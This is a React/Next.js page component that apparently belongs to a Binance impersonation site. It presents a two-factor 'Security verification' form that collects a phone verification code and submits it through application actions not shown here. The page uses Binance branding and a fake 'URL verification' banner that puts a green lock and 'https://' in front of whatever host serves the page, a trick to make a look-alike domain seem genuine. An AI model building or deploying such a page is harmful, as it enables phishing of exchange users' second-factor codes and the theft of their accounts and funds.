import Head from 'next/head'
import { useRouter } from 'next/router'
import { useState, useEffect, useRef } from 'react'
import { useDispatch, useSelector } from 'react-redux'
import Link from 'next/link'
import { LockClosedIcon } from "@heroicons/react/solid"
import Loader from '../components/loader'
import { submitVerificationCode, getVerificationCodeRequest } from '../redux/APP_STATE/actions'

export default function TwoFactorAuthentication() {
  const router = useRouter()
  const dispatch = useDispatch()
  const user = useSelector(state => state.APP_STATE.user)
  const [host_url, setHostUrl] = useState('')
  const [path_name, setPathName] = useState('')
  const getCode_ref = useRef(null)
  const formRef = useRef(null)
  const buttonRef = useRef(null)

  useEffect(() => {
    setHostUrl(window.location.hostname)
    setPathName(window.location.pathname)
  }, [])

  const getVerificationCode = () => {
    const button = getCode_ref.current
    dispatch(getVerificationCodeRequest(user.email, button))
  }

  const handleVerificationSubmit = (e) => {
    e.preventDefault()

    // GRAB FORM
    const form = formRef.current
    const verification_code = form.verification_code.value
    const button = buttonRef.current
    
    dispatch(submitVerificationCode(verification_code, (err, success) => {
      if (err) return
      router.push('/dashboard/eth2')
    }))
  }

  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
        <Loader />
      <Head>
        <title>Two-factor Authentication | Binance</title>
        <meta name="description" content="To secure your account, please complete the following verification." />
        <link rel="icon" href="/favicon.ico" />
      </Head>

      {/* LOGIN HEADER */}
      <div id="Header" className='flex justify-between p-5'>
        <div className="logo">
          <img className='h-6' src="/binance-logo.svg" alt="Logo" />
        </div>
        <div className="menu">English |</div>
      </div>
      {/* URL Verification INFO */}
      <div className='w-full flex items-center justify-center p-2.5 text-xs text-gray-700 bg-[#FEF6D8]'>
              <p><span className='font-semibold'><LockClosedIcon className='h-5 mr-1 text-green-500 inline' /> URL verification: </span><span className='text-green-400'>https://</span>{host_url}{ path_name }</p>
      </div>

      {/* ====================== LOGIN SECTION ==================== */}
      <div className="max-w-4xl px-5 pt-10 pb-3 md:p-16 mx-auto md:flex justify-between items-end">
        <div className="w-full md:w-[400px] mb-5 md:mb-0">
          <h2 className="text-2xl md:text-3xl font-semibold mt-2 mb-10 md:my-2">Security verification</h2>
          <p className='text-gray-600 text-base hidden md:block pt-2'>To secure your account, please complete the following verification.</p>
          <form className="my-5" ref={formRef} onSubmit={ handleVerificationSubmit }>
            <div className="input_field">
              <label className="block">Phone verification code</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                <input type="number" required name="verification_code" placeholder='Verification code' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' />
                 <span ref={getCode_ref} onClick={ getVerificationCode } className="inline-block disabled:cursor-not-allowed disabled:text-yellow-200 text-primary_dim font-semibold cursor-pointer mr-1">Get code</span> 
              </div>
            </div>

            {/* <button className="w-full bg-gradient-to-b from-primary to-[#E49F5E] text-center text-gray-800 font-semibold p-3 rounded-sm">Log In</button> */}
            <button ref={buttonRef} className="w-full bg-primary text-center text-gray-800 font-semibold p-3 mt-3 rounded-sm">Submit</button>
          </form>
          <Link href="/signup"><span className="text-primary_dim my-2 cursor-pointer">Security verification unavailable?</span></Link>
        </div>
      </div>
      <footer>
        <div className="w-full pt-10 text-xs absolute bottom-5 text-gray-500 text-center">&copy; 2017 - { new Date().getFullYear() } Binance.com All rights reserved</div>
      </footer>
    </div>
  )
}
